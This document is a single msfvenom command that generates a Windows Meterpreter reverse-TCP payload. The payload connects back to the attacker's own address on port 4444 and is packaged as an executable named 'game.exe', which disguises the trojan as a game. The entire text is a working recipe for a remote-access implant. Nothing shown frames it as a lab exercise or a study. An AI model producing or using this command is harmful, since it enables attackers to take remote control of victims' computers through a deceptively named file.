msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Our IP> LPORT=4444 --platform windows -f exe -o game.exe -a x86
